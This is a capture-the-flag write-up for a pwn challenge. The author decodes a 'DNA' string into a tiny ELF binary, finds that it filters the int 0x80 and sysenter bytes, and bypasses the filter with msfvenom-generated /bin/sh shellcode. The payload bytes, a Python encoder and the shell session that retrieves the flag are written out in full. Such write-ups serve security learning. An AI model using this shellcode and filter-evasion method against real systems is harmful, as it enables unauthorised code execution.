# Tiny - Misc/pwn (200)

Santa's tiniest elf has been kidnapped. Can you make him do what you want?

Service: nc 18.205.93.120 1209

## Analysis

Connecting to the service, we're greeted with a little dialog shown below. A
couple of the words are highlighted, but as it turns out, this isn't
important.

```  
$ nc 18.205.93.120 1209  
<Crazy_Scientist> Hello?  
<Crazy_Scientist> Anyone there?  
> hi  
<H4X0R> hi  
<Crazy_Scientist> Brilliant!  
<Crazy_Scientist> I'm at the north pole and I managed to kidnap one of Santa's
elves.  
<Crazy_Scientist> I've never seen such a tiny elf.  
<elf> Hi I'm elfo  
[elf has been kicked by Crazy_Scientist]  
<Crazy_Scientist> The elf will happily eat anything I feed it.  
<Crazy_Scientist> So I tried feeding him one of my mind control cookies  
<Crazy_Scientist> But it didn't work! The jolly bastard must have some kind of
immune system  
<Crazy_Scientist> Normally I wouldn't need help for such a trivial task, but I
didn't bring my laboratory to the north pole.  
<Crazy_Scientist> I could send you a sample of his DNA.  
<Crazy_Scientist> You work out how his immune system works and synthesize a
new mind control cookie and send that back to me. OK?  
<Crazy_Scientist> Then I'll give the elf your cookie and release him back into
Santa's workshop.  
<Crazy_Scientist> Then we can finally read the "secret", to see what's going
on in there.  
<Crazy_Scientist> I don't think the elf will be able to eat a cookie bigger
than half of his size though.  
<Crazy_Scientist> Are you ready?  
> hi  
<Crazy_Scientist> Yes or no..  
> yes  
<Crazy_Scientist> Excellent! I'll upload the DNA sample  
```

Once we answer yes, we're greeted with a large block of "DNA" made up of the
letters C, G, A, and T. The "mind control cookie" the service is expecting
seems to be some combination of those four letters in a size which is a
multiple of four. Other letters or other lengths are not accepted.

```  
CGGGCACCCAGACACTAAACAAACAAACAAAAAAAAAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAATAAAAAAAGAAAAAAACAAAA  
AAAAAAAACCCATAAAAACAAATAAGCAAAAAAAAAAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAGCAAAAAATAAAAAA  
AAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAAATAAAAACAAATAAAAATAAA  
AACAAATACGTCAAAAAAAAAAAACGTCAAAAAAAAAAAAAACC  
AAAAAAAAAAAAAAAAACAAAAAAAAAATATCGTACTATGAAAC  
TAAGGGTAAAATCGCCACGATAAGGAACAATATATGAATCCCAC  
CTCTTATGAAACCAACCTCTAGGCGAGCTAAACGCAAAGACTCT  
AGGCAAGGAGCACGCAAACTTAAAGGGAAAAACGCCGTTGGAAG

<Crazy_Scientist> Transmission complete!  
<Crazy_Scientist> Send me back the DNA of the mind control cookie as soon as
you can

Send back mind control cookie: asdf  
<Crazy_Scientist> That's not valid DNA!  
Send back mind control cookie: aaaa  
<Crazy_Scientist> That's not valid DNA!  
Send back mind control cookie: A  
<Crazy_Scientist> That's not valid DNA!  
Send back mind control cookie: AA  
<Crazy_Scientist> That's not valid DNA!  
Send back mind control cookie: AAA  
<Crazy_Scientist> That's not valid DNA!  
Send back mind control cookie: AAAA  
<Crazy_Scientist> Great, now let's get that elf back in here.  
[elf has joined]  
<elf> Hi I'm elfo  
[Crazy_Scientist hands elf the cookie]  
[elf eats the cookie]  
<Crazy_Scientist> Ok, let me release him back into Santa's workshop  
<Crazy_Scientist> If he finds the secret or anything else, he'll let us know
when he comes back  
[elf walks off in the wrong direction.]  
<Crazy_Scientist> Well, looks like this cookie got elf all confused.  
<Crazy_Scientist> I'll try to find a better hacker.  
[H4X0R has been kicked by Crazy_Scientist]  
```

At this point, I got stuck for a while, until I finally figured out that the
"DNA" itself needed to be decoded. It turns out each four characters
corresponds to one byte. I we map A, C, T, G to 0-3 in some way then we can
decode the "DNA". The python script below tries each of the 24 possible
combinations.

```python  
elf_dna = '''  
CGGGCACCCAGACACTAAACAAACAAACAAAAAAAAAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAATAAAAAAAGAAAAAAACAAAA  
AAAAAAAACCCATAAAAACAAATAAGCAAAAAAAAAAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAGCAAAAAATAAAAAA  
AAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAAATAAAAACAAATAAAAATAAA  
AACAAATACGTCAAAAAAAAAAAACGTCAAAAAAAAAAAAAACC  
AAAAAAAAAAAAAAAAACAAAAAAAAAATATCGTACTATGAAAC  
TAAGGGTAAAATCGCCACGATAAGGAACAATATATGAATCCCAC  
CTCTTATGAAACCAACCTCTAGGCGAGCTAAACGCAAAGACTCT  
AGGCAAGGAGCACGCAAACTTAAAGGGAAAAACGCCGTTGGAAG  
'''.strip()

def hex_dna(dna):  
	pats = []  
	for ch1 in 'ATGC':  
		for ch2 in 'ATGC':  
			if ch1 == ch2:  
				continue  
			for ch3 in 'ATGC':  
				if ch1 == ch3 or ch2 == ch3:  
					continue  
				for ch4 in 'ATGC':  
					if ch1 == ch4 or ch2 == ch4 or ch3 == ch4:  
						continue  
					pats.append(ch1+ch2+ch3+ch4)  
	print(pats)

	dna = ''.join(dna.strip().split())  
	for pat in pats:  
		arr = []  
		for i in range(0,len(dna),4):  
			x1 = pat.index(dna[i])  
			x2 = pat.index(dna[i+1])  
			x3 = pat.index(dna[i+2])  
			x4 = pat.index(dna[i+3])  
			x = (x1<<6)|(x2<<4)|(x3<<2)|x4  
			arr.append(x)  
		buf = bytes(arr)  
		with open('tiny/dna_%s.txt'%pat,'wb') as f:  
			f.write(buf)  
			f.close()  
		print(pat, buf)

if __name__ == '__main__':  
	hex_dna(elf_dna)  
```

With each possible decoding, we take a look at each one, and find that the
"ACTG" decoding turns the "DNA" into an elf executable - get it?

```  
$ ./challenge9.py  
['ATGC', 'ATCG', 'AGTC', 'AGCT', 'ACTG', 'ACGT', 'TAGC', 'TACG', 'TGAC',
'TGCA', 'TCAG', 'TCGA', 'GATC', 'GACT', 'GTAC', 'GTCA', 'GCAT', 'GCTA',
'CATG', 'CAGT', 'CTAG', 'CTGA', 'CGAT', 'CGTA']  
ATGC
b'\xea\xcf\xc8\xcd\x03\x03\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00\x03\x00\x00\x00\xfc@\x0c\x04,\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00,\x00\x10\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00@\x0c\x04\x00@\x0c\x04\xe7\x00\x00\x00\xe7\x00\x00\x00\x0f\x00\x00\x00\x000\x00\x00G\x93F\x03B\xa4\x01\xef8B\x83\x04F\x07\xf3\xddF\x03\xc3\xdd+\x8b@\xec\x08\xdd+\n,\xec\r@\xa8\x00\xef\x96\x82'  
ATCG
b'\xbf\x8a\x8c\x89\x02\x02\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x03\x00\x02\x00\x00\x00\xa8@\x08\x048\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x008\x00\x10\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00@\x08\x04\x00@\x08\x04\xb6\x00\x00\x00\xb6\x00\x00\x00\n\x00\x00\x00\x00
\x00\x00F\xd2G\x02C\xf4\x01\xba,C\xc2\x04G\x06\xa2\x99G\x02\x82\x99>\xce@\xb8\x0c\x99>\x0f8\xb8\t@\xfc\x00\xba\xd7\xc3'  
AGTC
b'\xd5\xcf\xc4\xce\x03\x03\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x00\x03\x00\x00\x00\xfc\x80\x0c\x08\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1c\x00
\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x80\x0c\x08\x00\x80\x0c\x08\xdb\x00\x00\x00\xdb\x00\x00\x00\x0f\x00\x00\x00\x000\x00\x00\x8bc\x89\x03\x81X\x02\xdf4\x81C\x08\x89\x0b\xf3\xee\x89\x03\xc3\xee\x17G\x80\xdc\x04\xee\x17\x05\x1c\xdc\x0e\x80T\x00\xdfiA'  
AGCT
b'\x95\x8a\x84\x8b\x02\x02\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x01\x00\x02\x00\x00\x00\xa8\xc0\x08\x0c\x18\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x18\x000\x00\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x08\x0c\x00\xc0\x08\x0c\x9e\x00\x00\x00\x9e\x00\x00\x00\n\x00\x00\x00\x00
\x00\x00\xcer\xcd\x02\xc1\\\x03\x9a$\xc1B\x0c\xcd\x0e\xa2\xbb\xcd\x02\x82\xbb\x16F\xc0\x98\x04\xbb\x16\x05\x18\x98\x0b\xc0T\x00\x9a}A'  
ACTG
b'\x7fELF\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x03\x00\x01\x00\x00\x00T\x80\x04\x084\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x00
\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x80\x04\x08\x00\x80\x04\x08y\x00\x00\x00y\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\x89\xe1\x8b\x01\x83\xf8\x02u\x1c\x83\xc1\x08\x8b\tQf\x8b\x01Af=\xcd\x80t\x0cf=\x0f4t\x06\x80\xfc\x00u\xeb\xc3'  
ACGT
b'jEHG\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x02\x00\x01\x00\x00\x00T\xc0\x04\x0c$\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x000\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x04\x0c\x00\xc0\x04\x0cm\x00\x00\x00m\x00\x00\x00\x05\x00\x00\x00\x00\x10\x00\x00\xcd\xb1\xce\x01\xc2\xac\x03e\x18\xc2\x81\x0c\xce\rQw\xce\x01Aw)\x89\xc0d\x08w)\n$d\x07\xc0\xa8\x00e\xbe\x82'  
TAGC
b'\xea\xdf\xd9\xdcWWWUUUUUUUUUTUVUWUUU\xfd\x15]QmUUUUUUUUUUUmUEUWUUUUUUUWUUUUUUUU\x15]QU\x15]Q\xe3UUU\xe3UUU_UUUUuUU\x13\x87\x12W\x16\xa1T\xefy\x16\x97Q\x12S\xf7\xcc\x12W\xd7\xcck\x9b\x15\xedY\xcckZm\xed\\\x15\xa9U\xef\x82\x96'  
TACG
b'\xbf\x9a\x9d\x98VVVUUUUUUUUUTUWUVUUU\xa9\x15YQyUUUUUUUUUUUyUEUVUUUUUUUVUUUUUUUU\x15YQU\x15YQ\xb2UUU\xb2UUUZUUUUeUU\x12\xc6\x13V\x17\xf1T\xbam\x17\xd6Q\x13R\xa6\x88\x13V\x96\x88~\xde\x15\xb9]\x88~_y\xb9X\x15\xfdU\xba\xc3\xd7'  
TGAC
b'\xd5\xef\xe6\xec\xab\xab\xab\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xa8\xaa\xa9\xaa\xab\xaa\xaa\xaa\xfe*\xae\xa2\x9e\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9e\xaa\x8a\xaa\xab\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xab\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa*\xae\xa2\xaa*\xae\xa2\xd3\xaa\xaa\xaa\xd3\xaa\xaa\xaa\xaf\xaa\xaa\xaa\xaa\xba\xaa\xaa#K!\xab)R\xa8\xdf\xb6)k\xa2!\xa3\xfb\xcc!\xab\xeb\xcc\x97g*\xde\xa6\xcc\x97\xa5\x9e\xde\xac*V\xaa\xdfAi'  
TGCA
b'\x95\xba\xb7\xb8\xfe\xfe\xfe\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xfd\xff\xfe\xff\xff\xff\xab?\xfb\xf3\xdb\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xdb\xff\xcf\xff\xfe\xff\xff\xff\xff\xff\xff\xff\xfe\xff\xff\xff\xff\xff\xff\xff\xff?\xfb\xf3\xff?\xfb\xf3\x92\xff\xff\xff\x92\xff\xff\xff\xfa\xff\xff\xff\xff\xef\xff\xff2N1\xfe=S\xfc\x9a\xe7=~\xf31\xf2\xae\x881\xfe\xbe\x88\xd6v?\x9b\xf7\x88\xd6\xf5\xdb\x9b\xf8?W\xff\x9aA}'  
TCAG
b'\x7fend\xa9\xa9\xa9\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xa8\xaa\xab\xaa\xa9\xaa\xaa\xaaV*\xa6\xa2\xb6\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xb6\xaa\x8a\xaa\xa9\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xa9\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa*\xa6\xa2\xaa*\xa6\xa2q\xaa\xaa\xaaq\xaa\xaa\xaa\xa5\xaa\xaa\xaa\xaa\x9a\xaa\xaa!\xc9#\xa9+\xf2\xa8u\x9e+\xe9\xa2#\xa1YD#\xa9iD\xbd\xed*v\xaeD\xbd\xaf\xb6v\xa4*\xfe\xaau\xc3\xeb'  
TCGA
b'ju{t\xfd\xfd\xfd\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xfe\xff\xfd\xff\xff\xffW?\xf7\xf3\xe7\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe7\xff\xcf\xff\xfd\xff\xff\xff\xff\xff\xff\xff\xfd\xff\xff\xff\xff\xff\xff\xff\xff?\xf7\xf3\xff?\xf7\xf3a\xff\xff\xffa\xff\xff\xff\xf5\xff\xff\xff\xff\xdf\xff\xff1\x8d2\xfd>\xa3\xfce\xdb>\xbd\xf32\xf1]D2\xfd}D\xe9\xb9?g\xfbD\xe9\xfa\xe7g\xf4?\xab\xffe\x82\xbe'  
GATC
b"\xc0\xdf\xd1\xdeWWWUUUUUUUUUVUTUWUUU\xfd\x95]YMUUUUUUUUUUUMUeUWUUUUUUUWUUUUUUUU\x95]YU\x95]Y\xcbUUU\xcbUUU_UUUUuUU\x9b'\x98W\x94\tV\xcfq\x94\x17Y\x98[\xf7\xee\x98W\xd7\xeeC\x13\x95\xcdQ\xeeCPM\xcd^\x95\x01U\xcf(\x14"  
GACT
b'\x80\x9a\x91\x9bVVVUUUUUUUUUWUTUVUUU\xa9\xd5Y]IUUUUUUUUUUUIUuUVUUUUUUUVUUUUUUUU\xd5Y]U\xd5Y]\x8eUUU\x8eUUUZUUUUeUU\xde6\xdcV\xd4\rW\x8aa\xd4\x16]\xdc^\xa6\xbb\xdcV\x96\xbbB\x12\xd5\x89Q\xbbBPI\x89[\xd5\x01U\x8a<\x14'  
GTAC
b'\xc0\xef\xe2\xed\xab\xab\xab\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xa9\xaa\xa8\xaa\xab\xaa\xaa\xaa\xfej\xae\xa6\x8e\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x8e\xaa\x9a\xaa\xab\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xab\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaaj\xae\xa6\xaaj\xae\xa6\xc7\xaa\xaa\xaa\xc7\xaa\xaa\xaa\xaf\xaa\xaa\xaa\xaa\xba\xaa\xaag\x1bd\xabh\x06\xa9\xcf\xb2h+\xa6d\xa7\xfb\xddd\xab\xeb\xdd\x83#j\xce\xa2\xdd\x83\xa0\x8e\xce\xadj\x02\xaa\xcf\x14('  
GTCA
b'\x80\xba\xb3\xb9\xfe\xfe\xfe\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfd\xff\xfc\xff\xfe\xff\xff\xff\xab\x7f\xfb\xf7\xcb\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xcb\xff\xdf\xff\xfe\xff\xff\xff\xff\xff\xff\xff\xfe\xff\xff\xff\xff\xff\xff\xff\xff\x7f\xfb\xf7\xff\x7f\xfb\xf7\x86\xff\xff\xff\x86\xff\xff\xff\xfa\xff\xff\xff\xff\xef\xff\xffv\x1et\xfe|\x07\xfd\x8a\xe3|>\xf7t\xf6\xae\x99t\xfe\xbe\x99\xc22\x7f\x8b\xf3\x99\xc2\xf0\xcb\x8b\xf9\x7f\x03\xff\x8a\x14<'  
GCAT
b'@ebg\xa9\xa9\xa9\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xab\xaa\xa8\xaa\xa9\xaa\xaa\xaaV\xea\xa6\xae\x86\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x86\xaa\xba\xaa\xa9\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xa9\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xea\xa6\xae\xaa\xea\xa6\xaeM\xaa\xaa\xaaM\xaa\xaa\xaa\xa5\xaa\xaa\xaa\xaa\x9a\xaa\xaa\xed9\xec\xa9\xe8\x0e\xabE\x92\xe8)\xae\xec\xadYw\xec\xa9iw\x81!\xeaF\xa2w\x81\xa0\x86F\xa7\xea\x02\xaaE<('  
GCTA
b'@usv\xfd\xfd\xfd\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xff\xfc\xff\xfd\xff\xff\xffW\xbf\xf7\xfb\xc7\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xc7\xff\xef\xff\xfd\xff\xff\xff\xff\xff\xff\xff\xfd\xff\xff\xff\xff\xff\xff\xff\xff\xbf\xf7\xfb\xff\xbf\xf7\xfbI\xff\xff\xffI\xff\xff\xff\xf5\xff\xff\xff\xff\xdf\xff\xff\xb9-\xb8\xfd\xbc\x0b\xfeE\xd3\xbc=\xfb\xb8\xf9]f\xb8\xfd}f\xc11\xbfG\xf3f\xc1\xf0\xc7G\xf6\xbf\x03\xffE(<'  
CATG
b'?\x10\x1d\x12TTTUUUUUUUUUVUWUTUUU\x01\x95QYqUUUUUUUUUUUqUeUTUUUUUUUTUUUUUUUU\x95QYU\x95QY8UUU8UUUPUUUUEUU\x98\xe4\x9bT\x97\xf9V0M\x97\xd4Y\x9bX\x04"\x9bT\x14"|\xdc\x951]"|_q1R\x95\xfdU0\xeb\xd7'  
CAGT
b'*\x10\x19\x13TTTUUUUUUUUUWUVUTUUU\x01\xd5Q]aUUUUUUUUUUUaUuUTUUUUUUUTUUUUUUUU\xd5Q]U\xd5Q],UUU,UUUPUUUUEUU\xdc\xb4\xdeT\xd6\xadW
I\xd6\x94]\xde\\\x043\xdeT\x143h\x98\xd5!Y3hZa!S\xd5\xa9U \xbe\x96'  
CTAG b'?
.!\xa8\xa8\xa8\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xa9\xaa\xab\xaa\xa8\xaa\xaa\xaa\x02j\xa2\xa6\xb2\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xb2\xaa\x9a\xaa\xa8\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xa8\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaaj\xa2\xa6\xaaj\xa2\xa64\xaa\xaa\xaa4\xaa\xaa\xaa\xa0\xaa\xaa\xaa\xaa\x8a\xaa\xaad\xd8g\xa8k\xf6\xa90\x8ek\xe8\xa6g\xa4\x08\x11g\xa8(\x11\xbc\xecj2\xae\x11\xbc\xaf\xb22\xa1j\xfe\xaa0\xd7\xeb'  
CTGA
b'*0;1\xfc\xfc\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfd\xff\xfe\xff\xfc\xff\xff\xff\x03\x7f\xf3\xf7\xe3\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe3\xff\xdf\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\x7f\xf3\xf7\xff\x7f\xf3\xf7$\xff\xff\xff$\xff\xff\xff\xf0\xff\xff\xff\xff\xcf\xff\xfft\x9cv\xfc~\xa7\xfd
\xcb~\xbc\xf7v\xf4\x0c\x11v\xfc<\x11\xe8\xb8\x7f#\xfb\x11\xe8\xfa\xe3#\xf1\x7f\xab\xff
\x96\xbe'  
CGAT b'\x15
&#\xa8\xa8\xa8\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xab\xaa\xa9\xaa\xa8\xaa\xaa\xaa\x02\xea\xa2\xae\x92\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x92\xaa\xba\xaa\xa8\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xa8\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xea\xa2\xae\xaa\xea\xa2\xae\x1c\xaa\xaa\xaa\x1c\xaa\xaa\xaa\xa0\xaa\xaa\xaa\xaa\x8a\xaa\xaa\xecx\xed\xa8\xe9^\xab\x10\x86\xe9h\xae\xed\xac\x083\xed\xa8(3\x94d\xea\x12\xa63\x94\xa5\x92\x12\xa3\xeaV\xaa\x10}i'  
CGTA
b'\x15072\xfc\xfc\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xff\xfe\xff\xfd\xff\xfc\xff\xff\xff\x03\xbf\xf3\xfb\xd3\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xd3\xff\xef\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xbf\xf3\xfb\xff\xbf\xf3\xfb\x18\xff\xff\xff\x18\xff\xff\xff\xf0\xff\xff\xff\xff\xcf\xff\xff\xb8l\xb9\xfc\xbd[\xfe\x10\xc7\xbd|\xfb\xb9\xf8\x0c"\xb9\xfc<"\xd4t\xbf\x13\xf7"\xd4\xf5\xd3\x13\xf2\xbfW\xff\x10i}'

$ file tiny/dna_*txt  
tiny/dna_ACGT.txt: data  
tiny/dna_ACTG.txt: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
statically linked, corrupted section header size  
tiny/dna_AGCT.txt: PGP  Secret Key -  
tiny/dna_AGTC.txt: data  
tiny/dna_ATCG.txt: data  
tiny/dna_ATGC.txt: data  
tiny/dna_CAGT.txt: data  
tiny/dna_CATG.txt: data  
tiny/dna_CGAT.txt: data  
tiny/dna_CGTA.txt: data  
tiny/dna_CTAG.txt: data  
tiny/dna_CTGA.txt: data  
tiny/dna_GACT.txt: data  
tiny/dna_GATC.txt: data  
tiny/dna_GCAT.txt: data  
tiny/dna_GCTA.txt: data  
tiny/dna_GTAC.txt: data  
tiny/dna_GTCA.txt: data  
tiny/dna_TACG.txt: data  
tiny/dna_TAGC.txt: data  
tiny/dna_TCAG.txt: data  
tiny/dna_TCGA.txt: Non-ISO extended-ASCII text, with no line terminators  
tiny/dna_TGAC.txt: Non-ISO extended-ASCII text, with no line terminators  
tiny/dna_TGCA.txt: PGP  Secret Key -  
```

## Disassembly

This elf executable is _very_ small (obviously given the name). Basically the
only logic the is the following pseudocode:

```  
main:  
 if argc != 2  
   jmp (undefined)  
 push argv[1]  
 ptr = argv[1]  
 while *(uint16*)ptr != 0:  
   if *(uint16*)ptr == 0x80CD:  
     jmp (undefined)  
   if *(uint16*)ptr == 0x340F:  
     jmp (undefined)  
   ptr++  
 return  
```

Basically this does two things. (1) If the shellcode in argv[1] contains the
byte pattern `CD 80` or `0F 34`, then error out, and (2) if not, then "return"
to the pushed "argv[1]", our shellcode. The bytes `CD 80` correspond to the
instruction `int 80` and the bytes `0F 34` correspond to `sysenter`. So
basically all we need to do is make some shellcode without these two
instructions. This is easy enough with `msfvenom`:

```  
$ msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x0f\x80' --smallest  
No platform was selected, choosing Msf::Module::Platform::Linux from the
payload  
No Arch selected, selecting Arch: x86 from the payload  
Found 10 compatible encoders  
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai  
x86/shikata_ga_nai succeeded with size 70 (iteration=0)  
Attempting to encode payload with 1 iterations of generic/none  
generic/none failed with Encoding failed due to a bad character (index=42,
char=0x80)  
Attempting to encode payload with 1 iterations of x86/call4_dword_xor  
x86/call4_dword_xor succeeded with size 68 (iteration=0)  
Attempting to encode payload with 1 iterations of x86/countdown  
x86/countdown succeeded with size 59 (iteration=0)  
Attempting to encode payload with 1 iterations of x86/fnstenv_mov  
x86/fnstenv_mov succeeded with size 66 (iteration=0)  
Attempting to encode payload with 1 iterations of x86/jmp_call_additive  
x86/jmp_call_additive succeeded with size 73 (iteration=0)  
Attempting to encode payload with 1 iterations of x86/alpha_mixed  
x86/alpha_mixed succeeded with size 147 (iteration=0)  
Attempting to encode payload with 1 iterations of x86/alpha_upper  
x86/alpha_upper succeeded with size 155 (iteration=0)  
Attempting to encode payload with 1 iterations of x86/nonalpha  
x86/nonalpha failed with Encoding failed due to a bad character (index=78,
char=0x80)  
Attempting to encode payload with 1 iterations of x86/nonupper  
x86/nonupper failed with Encoding failed due to a bad character (index=78,
char=0x80)  
x86/countdown chosen with final size 59  
Payload size: 59 bytes  
Final size of python file: 296 bytes  
buf =  ""  
buf += "\x6a\x2a\x59\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c\x0e"  
buf += "\x07\xe2\xfa\x6b\x09\x5b\x9d\x57\x60\x6f\x25\x6a\x83"  
buf += "\xec\x64\x22\x7d\x67\x10\x79\x3d\x71\x7d\x7b\x9f\xf4"  
buf += "\x4a\xf1\x12\x1b\x1c\x1d\x31\x7d\x49\x4f\x0d\x50\x4c"  
buf += "\x25\x71\x74\xa1\xc8\xe7\xab"  
```

Once we have this shellcode, we just convert it back to "DNA" to send to the
server.

```python  
def dna_hex(buf):  
	pat = 'ACTG'  
	st = []  
	for b in buf:  
		st.append(pat[(b>>6)&3])  
		st.append(pat[(b>>4)&3])  
		st.append(pat[(b>>2)&3])  
		st.append(pat[(b>>0)&3])  
	st = ''.join(st)  
	print(st)  
	return st

if __name__ == '__main__':

	buf =  b""  
	buf += b"\x6a\x2a\x59\xe8\xff\xff\xff\xff\xc1\x5e\x30\x4c\x0e"  
	buf += b"\x07\xe2\xfa\x6b\x09\x5b\x9d\x57\x60\x6f\x25\x6a\x83"  
	buf += b"\xec\x64\x22\x7d\x67\x10\x79\x3d\x71\x7d\x7b\x9f\xf4"  
	buf += b"\x4a\xf1\x12\x1b\x1c\x1d\x31\x7d\x49\x4f\x0d\x50\x4c"  
	buf += b"\x25\x71\x74\xa1\xc8\xe7\xab"  
	dna_hex(buf)  
```

## Shell

Once we have the new "DNA" ready we send it to the server and get our shell.
_However_, for some reason this shell isn't returning stdout. Luckily it does
return stderr so all we need to do is redirect each command to stderr. With
this shell we can finally get the flag:

```  
CGGGCACCCAGACACTAAACAAACAAACAAAAAAAAAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAATAAAAAAAGAAAAAAACAAAA  
AAAAAAAACCCATAAAAACAAATAAGCAAAAAAAAAAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAGCAAAAAATAAAAAA  
AAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAAAAA  
AAAAAAAAAAAAAAAAAAAAAAAATAAAAACAAATAAAAATAAA  
AACAAATACGTCAAAAAAAAAAAACGTCAAAAAAAAAAAAAACC  
AAAAAAAAAAAAAAAAACAAAAAAAAAATATCGTACTATGAAAC  
TAAGGGTAAAATCGCCACGATAAGGAACAATATATGAATCCCAC  
CTCTTATGAAACCAACCTCTAGGCGAGCTAAACGCAAAGACTCT  
AGGCAAGGAGCACGCAAACTTAAAGGGAAAAACGCCGTTGGAAG

<Crazy_Scientist> Transmission complete!  
<Crazy_Scientist> Send me back the DNA of the mind control cookie as soon as
you can

Send back mind control cookie:
CTTTATTTCCTCGTTAGGGGGGGGGGGGGGGGGAACCCGTAGAACAGAAAGTAACGGTATGGTTCTTGAATCCCTGTCGCCCCGCTAACTGGATCCCTTTTAAGGTGACTCAATATCGGCCTCGACAACGTCAGGCCGACCGGCCGTGTCGGGGCACATTGGACACATACTGACGAACGCAGACCGGCCATCCAGGAAGCCCAACAGAATCCCGACCGCATTACGATAGTCGTTTG  
<Crazy_Scientist> Great, now let's get that elf back in here.  
[elf has joined]  
<elf> Hi I'm elfo  
[Crazy_Scientist hands elf the cookie]  
[elf eats the cookie]  
<Crazy_Scientist> Ok, let me release him back into Santa's workshop  
<Crazy_Scientist> If he finds the secret or anything else, he'll let us know
when he comes back  
id  
ls  
ls /  
cat flag  
a  
/bin/sh: 5: a: not found  
ls 2>&1  
ls 2&>1  
/bin/sh: 7: cannot create 1: Permission denied  
ls: cannot access '2': No such file or directory  
ls 1>&2  
flag  
secret  
server.py  
tiny  
cat flag 1>&2  
This is not the ./secret you are looking for  
cat secret 1>&2  
AOTW{mUcH_DnA_S0_t1nY_SuCh_sYsCaLl_w0w_456215}  
cat server 1>&2  
```  

Original writeup
(https://github.com/nononovak/otwadvent2018-ctfwriteup/blob/master/day9.md).